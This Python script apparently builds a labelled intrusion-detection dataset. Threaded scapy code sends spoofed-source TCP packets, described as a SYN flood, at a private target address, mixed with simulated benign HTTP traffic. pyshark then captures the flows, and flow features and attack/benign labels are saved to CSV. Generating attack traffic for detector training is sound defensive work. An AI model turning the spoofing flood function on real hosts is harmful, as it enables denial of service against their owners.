import scapy.all as scapy
import threading
import time
import random
import pyshark
import pandas as pd
import numpy as np
from collections import defaultdict

# Define interface and parameters
INTERFACE = "Wi-Fi 2"
CAPTURE_DURATION = 200
OUTPUT_CSV = "captured_traffic_with_labels.csv"

# Flow statistics storage
flow_stats = defaultdict(lambda: {
    "Start Time": None,
    "Last Packet Time": None,
    "Fwd IATs": [],
    "Bwd IATs": [],
    "Active Times": [],
    "Idle Times": [],
    "Packet Lengths": [],
    "Fwd Packet Lengths": [],
    "Bwd Packet Lengths": [],
    "Total Length of Fwd Packets": 0,
    "Total Length of Bwd Packets": 0,
    "Subflow Fwd Bytes": 0,
    "Subflow Bwd Bytes": 0,
    "Fwd Packets": 0,
    "Bwd Packets": 0,
    "Fwd Push Flags": 0,
    "Bwd Push Flags": 0,
    "act_data_pkt_fwd": 0,
    "Label": "nil"
})

# Target
TARGET_IP = "192.168.9.100"
TARGET_PORT = 80

# Fixed Benign Users (10 Fixed IPs)
BENIGN_USERS = [
    "192.168.1.10", "192.168.1.20", "192.168.1.30", "192.168.1.40",
    "192.168.1.50", "192.168.1.60", "192.168.1.70", "192.168.1.80",
    "192.168.1.90", "192.168.1.100"
]

# Generate Random Attacker IPs
def generate_random_ip():
    return f"192.168.{random.randint(2, 255)}.{random.randint(1, 255)}"

# Number of Attackers
NUM_ATTACKERS = 10

# Number of attack threads
NUM_ATTACK_THREADS = NUM_ATTACKERS

# Duration before switching to another benign IP
BENIGN_SESSION_TIME = random.uniform(5, 15)  # Maintain connection for 5-15 seconds

# Global timer
global_start_time = time.time()

def syn_flood():
    """Attack function generating SYN flood packets."""
    while time.time() - global_start_time < CAPTURE_DURATION:
        src_ip = generate_random_ip()
        sport = random.randint(1024, 65535)
        flags = random.choice(["S", "SA", "R", "FA"])

        ip = scapy.IP(src=src_ip, dst=TARGET_IP)
        tcp = scapy.TCP(sport=sport, dport=TARGET_PORT, flags=flags, seq=random.randint(1000, 9000))
        payload = scapy.Raw(load=bytes(random.randint(10, 100)))

        packet = ip / tcp / payload
        scapy.send(packet, verbose=False)
        print(f"Attack IP {src_ip} sent a request")
        time.sleep(random.uniform(2,3 ))

    print("SYN Flood attack stopped.")

def benign_traffic():
    """Benign traffic simulation."""
    while time.time() - global_start_time < CAPTURE_DURATION:
        selected_ip = random.choice(BENIGN_USERS)
        session_start = time.time()

        while time.time() - session_start < BENIGN_SESSION_TIME and time.time() - global_start_time < CAPTURE_DURATION:
            sport = random.randint(1024, 1055)
            ip = scapy.IP(src=selected_ip, dst=TARGET_IP)
            tcp = scapy.TCP(sport=sport, dport=TARGET_PORT, flags="PA")

            http_get = "GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"
            tcp_payload = scapy.Raw(load=http_get) if random.random() > 0.3 else scapy.Raw(load="Hello, server!")

            packet = ip / tcp / tcp_payload
            scapy.send(packet, verbose=False)

            print(f"Benign IP {selected_ip} sent a request")
            time.sleep(random.uniform(0.01, 0.1))

        print(f"Switching benign IP from {selected_ip} to a new one.")

    print("Benign traffic simulation stopped.")

# Create and start attack threads
attack_threads = [threading.Thread(target=syn_flood, daemon=True) for _ in range(NUM_ATTACK_THREADS)]
for thread in attack_threads:
    thread.start()

# Create and start benign threads
benign_threads = [threading.Thread(target=benign_traffic, daemon=True) for _ in range(len(BENIGN_USERS))]
for thread in benign_threads:
    thread.start()

# Packet processing function


def process_packet(packet):
    try:
        if (hasattr(packet, "ip") or hasattr(packet, "ipv6")) and hasattr(packet, "transport_layer"):
            if hasattr(packet, "ip"):
                src_ip = getattr(packet.ip, "src", None)
                dst_ip = getattr(packet.ip, "dst", None)
            else:
                src_ip = getattr(packet.ipv6, "src", None)
                dst_ip = getattr(packet.ipv6, "dst", None)
            # Drop packets that are neither from nor to the target IP
            if src_ip != TARGET_IP and dst_ip != TARGET_IP:
                return 

            protocol = packet.transport_layer
            timestamp = float(packet.sniff_time.timestamp())

            if hasattr(packet[protocol], "srcport") and hasattr(packet[protocol], "dstport"):
                src_port = int(getattr(packet[protocol], "srcport", 0))
                dst_port = int(getattr(packet[protocol], "dstport", 0))
                pkt_length = int(getattr(packet, "length", 0))

                flow_key = (src_ip, src_port, dst_ip, dst_port, protocol)

                # Initialize Start Time only for the first packet of the flow
                if flow_stats[flow_key]["Start Time"] is None:
                    flow_stats[flow_key]["Start Time"] = timestamp
                    flow_stats[flow_key]["Last Packet Time"] = timestamp
                    #print(f"Flow {flow_key}: Start Time set to {timestamp}")

                # Update Last Packet Time for subsequent packets
                last_time = flow_stats[flow_key]["Last Packet Time"]
                flow_stats[flow_key]["Last Packet Time"] = timestamp

                # Compute inter-arrival times
                if last_time:
                    
                    iat = timestamp - last_time
                    if src_ip == getattr(packet, "ip", getattr(packet, "ipv6", None)).src:
                        flow_stats[flow_key]["Fwd IATs"].append(iat)
                    else:
                        flow_stats[flow_key]["Bwd IATs"].append(iat)

                # Active and idle time calculation
                if last_time:
                    
                    time_diff = timestamp - last_time
                    if time_diff < 1:  # Active threshold
                        flow_stats[flow_key]["Active Times"].append(time_diff)
                    else:
                        flow_stats[flow_key]["Idle Times"].append(time_diff)

                # Store forward and backward packet lengths
                flow_stats[flow_key]["Packet Lengths"].append(pkt_length)
                if src_ip == getattr(packet, "ip", getattr(packet, "ipv6", None)).src:
                    flow_stats[flow_key]["Fwd Packet Lengths"].append(pkt_length)
                    flow_stats[flow_key]["Total Length of Fwd Packets"] += pkt_length
                    flow_stats[flow_key]["Subflow Fwd Bytes"] += pkt_length
                    flow_stats[flow_key]["Fwd Packets"] += 1
                    if hasattr(packet[protocol], "flags") and int(getattr(packet[protocol], "flags", "0"), 16) & 0x08:
                        flow_stats[flow_key]["Fwd Push Flags"] += 1
                else:
                    flow_stats[flow_key]["Bwd Packet Lengths"].append(pkt_length)
                    flow_stats[flow_key]["Total Length of Bwd Packets"] += pkt_length
                    flow_stats[flow_key]["Subflow Bwd Bytes"] += pkt_length
                    flow_stats[flow_key]["Bwd Packets"] += 1
                    if hasattr(packet[protocol], "flags") and int(getattr(packet[protocol], "flags", "0"), 16) & 0x08:
                        flow_stats[flow_key]["Bwd Push Flags"] += 1

                # **New: Detect SYN Flood Attack**
                if src_ip in BENIGN_USERS:
                    flow_stats[flow_key]["Label"] = "benign"
                elif(src_ip not in BENIGN_USERS and dst_ip == TARGET_IP):
                    flow_stats[flow_key]["Label"] = "attack"

    except Exception as e:
        print(f"Error processing packet: {e}")


# Start capture
print(f"Capturing on {INTERFACE} for {CAPTURE_DURATION} seconds...")
capture = pyshark.LiveCapture(interface=INTERFACE,bpf_filter="tcp or udp")

start_time = time.time()
for packet in capture.sniff_continuously():
    if time.time() - start_time > CAPTURE_DURATION:
        break
    process_packet(packet)

# Compute features
data = []
for flow_key, stats in flow_stats.items():
    duration = max((stats["Last Packet Time"] - stats["Start Time"]), 1e-10)
    #print(f"Flow {flow_key}: Start Time = {stats['Start Time']}, Last Packet Time = {stats['Last Packet Time']}, Duration = {duration}")
    feature_vector = {
            "Flow Duration": duration,
            "Flow Bytes/s": (stats["Total Length of Fwd Packets"] + stats["Total Length of Bwd Packets"]) / duration,
            "Flow Packets/s": (stats["Fwd Packets"] + stats["Bwd Packets"]) / duration,
            "Total Fwd Packets": stats["Fwd Packets"],
            "Total Bwd Packets": stats["Bwd Packets"],
            "Fwd Packet Length Min": min(stats["Fwd Packet Lengths"], default=0),
            "Fwd Packet Length Max": max(stats["Fwd Packet Lengths"], default=0),
            "Fwd Packet Length Mean": np.mean(stats["Fwd Packet Lengths"]) if stats["Fwd Packet Lengths"] else 0,
            "Bwd Packet Length Min": min(stats["Bwd Packet Lengths"], default=0),
            "Bwd Packet Length Max": max(stats["Bwd Packet Lengths"], default=0),
            "Bwd Packet Length Mean": np.mean(stats["Bwd Packet Lengths"]) if stats["Bwd Packet Lengths"] else 0,
            "Fwd IAT Mean": np.mean(stats["Fwd IATs"]) if stats["Fwd IATs"] else 0,
            "Fwd IAT Std": np.std(stats["Fwd IATs"]) if stats["Fwd IATs"] else 0,
            "Bwd IAT Mean": np.mean(stats["Bwd IATs"]) if stats["Bwd IATs"] else 0,
            "Active Std": np.std(stats["Active Times"]) if stats["Active Times"] else 0,
            "Idle Std": np.std(stats["Idle Times"]) if stats["Idle Times"] else 0,
            "Fwd Push Flags Count": stats["Fwd Push Flags"],
            "Bwd Push Flags Count": stats["Bwd Push Flags"],
            "Label": stats["Label"]
        }


    data.append(feature_vector)

# Save to CSV
pd.DataFrame(data).to_csv(OUTPUT_CSV, index=False, float_format="%.10f")
print(f"Results saved to {OUTPUT_CSV}")


